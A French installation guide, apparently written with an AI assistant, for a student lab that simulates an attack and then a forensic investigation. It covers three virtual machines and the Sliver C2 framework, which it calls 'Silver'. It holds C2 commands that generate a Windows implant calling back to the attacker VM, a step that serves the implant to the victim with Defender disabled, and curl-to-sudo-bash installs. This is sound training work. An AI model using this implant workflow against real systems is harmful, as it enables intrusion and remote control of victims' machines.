# GUIDE D'INSTALLATION PAS √Ä PAS - PROJET M1 SILVER C2
## Installation Compl√®te et Premi√®re Utilisation

### üéØ **Objectif**
Ce guide vous accompagne √©tape par √©tape pour installer et utiliser pour la premi√®re fois le package complet Projet M1 Silver C2.

**Dur√©e totale estim√©e : 2-3 heures**

---

## üìã **√âTAPE 1 : PR√âREQUIS ET PR√âPARATION** (15 min)

### Mat√©riel Requis
- **Ordinateur h√¥te** : 16 GB RAM minimum (32 GB recommand√©)
- **Espace disque** : 200 GB libres minimum
- **Virtualisation** : VirtualBox 6.1+ ou VMware Workstation 15+
- **Connexion Internet** : Pour t√©l√©chargements et mises √† jour

### Logiciels √† T√©l√©charger
1. **VirtualBox** : https://www.virtualbox.org/wiki/Downloads
2. **Kali Linux ISO** : https://www.kali.org/get-kali/#kali-installer-images
3. **Windows 10 ISO** : https://www.microsoft.com/software-download/windows10
4. **Ubuntu 22.04 LTS ISO** : https://ubuntu.com/download/desktop

### V√©rification de la Virtualisation
```bash
# Sur Linux/macOS
egrep -c '(vmx|svm)' /proc/cpuinfo

# Sur Windows (PowerShell en tant qu'admin)
Get-ComputerInfo | Select-Object HyperVRequirementVirtualizationFirmwareEnabled
```

---

## üñ•Ô∏è **√âTAPE 2 : CR√âATION DES MACHINES VIRTUELLES** (45 min)

### VM1 - Kali Linux (Attaquant)
```
Configuration VM :
- Nom : VM1-Kali-Attacker
- Type : Linux
- Version : Debian (64-bit)
- RAM : 4 GB (8 GB si possible)
- Disque : 60 GB (dynamique)
- CPU : 2 c≈ìurs
- R√©seau 1 : NAT (pour Internet)
- R√©seau 2 : Host-Only Adapter
```

**Installation Kali :**
1. Monter l'ISO Kali Linux
2. D√©marrer la VM
3. Choisir "Graphical Install"
4. Configuration :
   - Langue : Fran√ßais (ou English)
   - Pays : France
   - Clavier : Fran√ßais
   - Nom d'h√¥te : kali-attacker
   - Utilisateur : kali
   - Mot de passe : (votre choix, ex: kali)
5. Partitionnement : "Assist√© - utiliser un disque entier"
6. Terminer l'installation et red√©marrer

### VM2 - Windows 10 (Victime)
```
Configuration VM :
- Nom : VM2-Windows-Victim  
- Type : Microsoft Windows
- Version : Windows 10 (64-bit)
- RAM : 4 GB
- Disque : 80 GB (dynamique)
- CPU : 2 c≈ìurs
- R√©seau : Host-Only Adapter uniquement
```

**Installation Windows 10 :**
1. Monter l'ISO Windows 10
2. D√©marrer la VM
3. Suivre l'installation standard
4. Configuration :
   - Nom d'ordinateur : VICTIM-PC
   - Utilisateur : victim
   - Mot de passe : Password123
5. **IMPORTANT** : D√©sactiver Windows Defender temporairement

### VM3 - Ubuntu (Analyste)
```
Configuration VM :
- Nom : VM3-Ubuntu-Analyst
- Type : Linux  
- Version : Ubuntu (64-bit)
- RAM : 8 GB (minimum 6 GB)
- Disque : 100 GB (dynamique)
- CPU : 4 c≈ìurs
- R√©seau 1 : NAT (pour Internet)
- R√©seau 2 : Host-Only Adapter
```

**Installation Ubuntu :**
1. Monter l'ISO Ubuntu 22.04
2. D√©marrer la VM
3. Choisir "Try or Install Ubuntu"
4. Configuration :
   - Nom : analyst
   - Nom d'ordinateur : ubuntu-analyst
   - Mot de passe : analyst123
5. Installation normale avec mises √† jour

---

## üåê **√âTAPE 3 : CONFIGURATION R√âSEAU** (20 min)

### Configuration VirtualBox Host-Only
```bash
# Cr√©er le r√©seau Host-Only
VBoxManage hostonlyif create
VBoxManage hostonlyif ipconfig vboxnet0 --ip 192.168.56.1 --netmask 255.255.255.0
```

### Configuration IP sur chaque VM

**VM1 (Kali) :**
```bash
# Se connecter en SSH ou console directe
sudo nano /etc/netplan/01-netcfg.yaml

# Contenu du fichier :
network:
  version: 2
  ethernets:
    eth0:
      dhcp4: true  # NAT pour Internet
    eth1:
      dhcp4: false
      addresses: [192.168.56.10/24]

# Appliquer la configuration
sudo netplan apply
```

**VM2 (Windows) :**
```powershell
# Ouvrir PowerShell en tant qu'administrateur
netsh interface ip set address "Ethernet" static 192.168.56.20 255.255.255.0 192.168.56.1
```

**VM3 (Ubuntu) :**
```bash
sudo nano /etc/netplan/01-network-manager-all.yaml

# Ajouter la configuration Host-Only
network:
  version: 2
  ethernets:
    enp0s3:
      dhcp4: true  # NAT pour Internet
    enp0s8:
      dhcp4: false
      addresses: [192.168.56.30/24]

sudo netplan apply
```

### Test de Connectivit√©
```bash
# Depuis VM1 (Kali)
ping -c 3 192.168.56.20  # VM2
ping -c 3 192.168.56.30  # VM3

# Depuis VM3 (Ubuntu)
ping -c 3 192.168.56.10  # VM1
ping -c 3 192.168.56.20  # VM2
```

---

## üì• **√âTAPE 4 : T√âL√âCHARGEMENT DU PACKAGE PROJET M1** (10 min)

### Sur VM1 (Kali)
```bash
# Cr√©er le r√©pertoire de travail
mkdir -p ~/projet-m1-package
cd ~/projet-m1-package

# T√©l√©charger tous les fichiers que j'ai cr√©√©s
# (Vous devrez copier tous les fichiers .md, .sh, .py depuis notre conversation)

# Exemple : copier le contenu de chaque fichier dans des nouveaux fichiers
nano guide-silver-c2-kali.md
# Coller le contenu du guide complet

nano projet-m1-infrastructure-setup.md
# Coller le contenu du guide d'infrastructure

# R√©p√©ter pour tous les fichiers cr√©√©s...
```

### Structure des Fichiers √† Cr√©er
```
~/projet-m1-package/
‚îú‚îÄ‚îÄ guides/
‚îÇ   ‚îú‚îÄ‚îÄ guide-silver-c2-kali.md
‚îÇ   ‚îú‚îÄ‚îÄ projet-m1-infrastructure-setup.md
‚îÇ   ‚îú‚îÄ‚îÄ projet-m1-silver-c2-setup.md
‚îÇ   ‚îú‚îÄ‚îÄ projet-m1-scenarios-attaque.md
‚îÇ   ‚îú‚îÄ‚îÄ projet-m1-investigation-forensique.md
‚îÇ   ‚îî‚îÄ‚îÄ projet-m1-templates-rapport.md
‚îú‚îÄ‚îÄ scripts/
‚îÇ   ‚îú‚îÄ‚îÄ install-silver-c2.sh
‚îÇ   ‚îú‚îÄ‚îÄ exemples-scripts-silver.py
‚îÇ   ‚îî‚îÄ‚îÄ silver-c2-cheatsheet.md
‚îî‚îÄ‚îÄ automatisation/
    ‚îú‚îÄ‚îÄ projet-m1-scripts-automatisation-partie1.md
    ‚îú‚îÄ‚îÄ projet-m1-scripts-automatisation-partie2.md
    ‚îî‚îÄ‚îÄ projet-m1-scripts-automatisation-partie3-finale.md
```

---

## ‚ö° **√âTAPE 5 : INSTALLATION DE SILVER C2** (30 min)

### Sur VM1 (Kali)
```bash
# Rendre le script d'installation ex√©cutable
chmod +x install-silver-c2.sh

# Lancer l'installation automatique
./install-silver-c2.sh

# Si le script automatique √©choue, installation manuelle :
```

### Installation Manuelle Silver C2
```bash
# 1. Installer Go
GO_VERSION="1.21.5"
wget https://go.dev/dl/go${GO_VERSION}.linux-amd64.tar.gz
sudo rm -rf /usr/local/go
sudo tar -C /usr/local -xzf go${GO_VERSION}.linux-amd64.tar.gz
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
source ~/.bashrc

# 2. V√©rifier Go
go version

# 3. Installer Silver C2
curl https://sliver.sh/install | sudo bash

# 4. V√©rifier l'installation
sliver-server version
sliver-client version
```

### Configuration Initiale
```bash
# Cr√©er la structure du projet
mkdir -p ~/project-m1/{config,payloads,logs,evidence,reports,scripts}

# Extraire et configurer tous les scripts depuis les fichiers MD
# (Copier le contenu des scripts des fichiers d'automatisation)

# Rendre les scripts ex√©cutables
chmod +x ~/project-m1/scripts/*.sh
chmod +x ~/project-m1/scripts/*.py
```

---

## üîß **√âTAPE 6 : CONFIGURATION DU PROJET M1** (20 min)

### D√©ploiement des Scripts
```bash
# Depuis les fichiers MD d'automatisation, extraire les scripts :

# 1. setup-project-m1.sh (depuis partie 1)
nano ~/project-m1/scripts/setup-project-m1.sh
# Coller le contenu du script complet

# 2. attack-automation.py (depuis partie 1)
nano ~/project-m1/scripts/attack-automation.py
# Coller le contenu du script complet

# 3. project-orchestrator.py (depuis partie 3)
nano ~/project-m1/scripts/project-orchestrator.py
# Coller le contenu du script complet

# 4. project-validator.sh (depuis partie 3)
nano ~/project-m1/scripts/project-validator.sh
# Coller le contenu du script complet

# 5. project-reset.sh (depuis partie 3)
nano ~/project-m1/scripts/project-reset.sh
# Coller le contenu du script complet

# Rendre tous les scripts ex√©cutables
chmod +x ~/project-m1/scripts/*
```

### Configuration Initiale du Projet
```bash
# Lancer la configuration automatique
cd ~/project-m1/scripts
./setup-project-m1.sh

# Si succ√®s, validation du syst√®me
./project-validator.sh
```

---

## üîç **√âTAPE 7 : INSTALLATION DES OUTILS FORENSIQUES (VM3)** (45 min)

### Sur VM3 (Ubuntu)
```bash
# Mise √† jour du syst√®me
sudo apt update && sudo apt upgrade -y

# Installation des outils forensiques de base
sudo apt install -y volatility3 sleuthkit autopsy
sudo apt install -y python3-pip git curl wget

# Installation Volatility depuis les sources (version la plus r√©cente)
git clone https://github.com/volatilityfoundation/volatility3.git
cd volatility3
pip3 install -r requirements.txt
python3 setup.py install --user

# V√©rification des installations
vol --help
sleuthkit --version
```

### T√©l√©chargement de Belkasoft RAM Capturer (VM2)
```powershell
# Sur VM2 (Windows), t√©l√©charger depuis :
# https://belkasoft.com/ram-capturer

# Cr√©er les r√©pertoires n√©cessaires
New-Item -ItemType Directory -Path "C:\Tools\BelkasoftRAMCapturer" -Force
New-Item -ItemType Directory -Path "C:\Evidence" -Force
```

---

## üöÄ **√âTAPE 8 : PREMI√àRE UTILISATION** (30 min)

### Test de Connectivit√© Compl√®te
```bash
# Sur VM1 (Kali)
cd ~/project-m1/scripts

# Test de connectivit√© r√©seau
ping -c 2 192.168.56.20  # VM2
ping -c 2 192.168.56.30  # VM3

# Validation compl√®te du syst√®me
./project-validator.sh
```

### Lancement de la Premi√®re Simulation
```bash
# Mode interactif recommand√© pour la premi√®re fois
python3 project-orchestrator.py

# S√©lectionner option 1 : "V√©rifier les pr√©requis"
# Puis option 3 : "Workflow √©tape par √©tape"
```

### √âtapes de la Premi√®re Simulation

**1. D√©marrage Silver C2**
```bash
# L'orchestrateur propose de d√©marrer Silver
# Ou manuellement :
sudo sliver-server daemon --lhost 192.168.56.10 --lport 31337 &

# Dans un nouveau terminal :
sliver-client
# V√©rifier que la connexion fonctionne
```

**2. G√©n√©ration du Premier Payload**
```bash
# Dans la console Silver
sliver > http --lhost 192.168.56.10 --lport 8080
sliver > generate --http 192.168.56.10:8080 --os windows --arch amd64 --format exe --save ~/project-m1/payloads/test-payload.exe
```

**3. Test de Connectivit√© Payload**
```bash
# D√©marrer un serveur HTTP simple pour servir le payload
cd ~/project-m1/payloads
python3 -m http.server 8000

# Sur VM2 (Windows), t√©l√©charger via navigateur :
# http://192.168.56.10:8000/test-payload.exe
```

**4. Ex√©cution et V√©rification de Session**
```powershell
# Sur VM2, ex√©cuter le payload (Windows Defender doit √™tre d√©sactiv√©)
# Double-cliquer sur le fichier t√©l√©charg√©

# Sur VM1, v√©rifier la session dans Silver
sliver > sessions
# Vous devriez voir une nouvelle session active
```

---

## ‚úÖ **√âTAPE 9 : VALIDATION DE L'INSTALLATION** (15 min)

### Checklist de Validation
```bash
# Sur VM1 (Kali)
echo "=== VALIDATION PROJET M1 ==="

# 1. Silver C2 fonctionne
pgrep -f sliver-server && echo "‚úÖ Silver serveur actif" || echo "‚ùå Silver serveur arr√™t√©"

# 2. Connectivit√© r√©seau
ping -c 1 192.168.56.20 > /dev/null && echo "‚úÖ VM2 accessible" || echo "‚ùå VM2 inaccessible"
ping -c 1 192.168.56.30 > /dev/null && echo "‚úÖ VM3 accessible" || echo "‚ùå VM3 inaccessible"

# 3. Scripts pr√©sents
[ -f ~/project-m1/scripts/project-orchestrator.py ] && echo "‚úÖ Orchestrateur pr√©sent" || echo "‚ùå Orchestrateur manquant"

# 4. Payload g√©n√©r√©
[ -f ~/project-m1/payloads/test-payload.exe ] && echo "‚úÖ Payload g√©n√©r√©" || echo "‚ùå Payload manquant"

# 5. Session Silver active
sliver-client -c "sessions" | grep -q "session_" && echo "‚úÖ Session active" || echo "‚ùå Aucune session"
```

### Test de G√©n√©ration de Rapport
```bash
# Sur VM3 (Ubuntu), tester la g√©n√©ration de rapport
mkdir -p ~/forensics/reports
echo "Test de g√©n√©ration de rapport..." > ~/forensics/reports/test-report.txt
ls -la ~/forensics/reports/
```

---

## üéâ **PREMI√àRE SIMULATION COMPL√àTE** (45 min)

### Lancement du Workflow Automatique
```bash
# Sur VM1 (Kali)
cd ~/project-m1/scripts

# Mode automatique complet
python3 project-orchestrator.py --mode auto

# Ou mode interactif √©tape par √©tape (recommand√©)
python3 project-orchestrator.py
# S√©lectionner option 2 : "Workflow complet automatique"
```

### Actions Manuelles Requises
1. **Sur VM2** : Ex√©cuter le payload quand demand√©
2. **Sur VM2** : Lancer la collecte de preuves avec Belkasoft
3. **Sur VM3** : V√©rifier que les outils forensiques fonctionnent

### V√©rification des R√©sultats
```bash
# V√©rifier les artefacts cr√©√©s
ls -la ~/project-m1/evidence/
ls -la ~/project-m1/reports/
ls -la ~/project-m1/logs/

# Sur VM3, v√©rifier l'analyse
ls -la ~/forensics/analysis/
ls -la ~/forensics/reports/
```

---

## üõ†Ô∏è **D√âPANNAGE COMMUN**

### Probl√®me : Silver C2 ne d√©marre pas
```bash
# Solution 1 : V√©rifier Go
go version
export PATH=$PATH:/usr/local/go/bin

# Solution 2 : R√©installer Silver
sudo rm -rf ~/.sliver
curl https://sliver.sh/install | sudo bash
```

### Probl√®me : VMs ne communiquent pas
```bash
# V√©rifier la configuration r√©seau VirtualBox
VBoxManage list hostonlyifs
VBoxManage showvminfo VM1-Kali-Attacker | grep NIC

# Reconfigurer si n√©cessaire
VBoxManage modifyvm VM1-Kali-Attacker --nic2 hostonly --hostonlyadapter2 vboxnet0
```

### Probl√®me : Payload non g√©n√©r√©
```bash
# V√©rifier que Silver serveur est d√©marr√©
sudo sliver-server daemon --log-level debug

# Test de g√©n√©ration manuelle
sliver-client -c "generate --http 127.0.0.1:8080 --os windows --format exe"
```

---

## üéØ **PROCHAINES √âTAPES**

Une fois l'installation valid√©e :

1. **üìö √âtudier la documentation compl√®te** dans les guides cr√©√©s
2. **üéØ Pratiquer les sc√©narios d'attaque** √©tape par √©tape
3. **üîç Ma√Ætriser les outils forensiques** sur des √©chantillons
4. **üìä Personnaliser les rapports** selon vos besoins
5. **üîÑ Utiliser le reset** pour de nouvelles simulations

---

**üéâ F√âLICITATIONS ! Votre environnement Projet M1 Silver C2 est maintenant op√©rationnel !**

Pour toute question ou probl√®me, consultez la documentation compl√®te ou les logs d√©taill√©s g√©n√©r√©s par les scripts.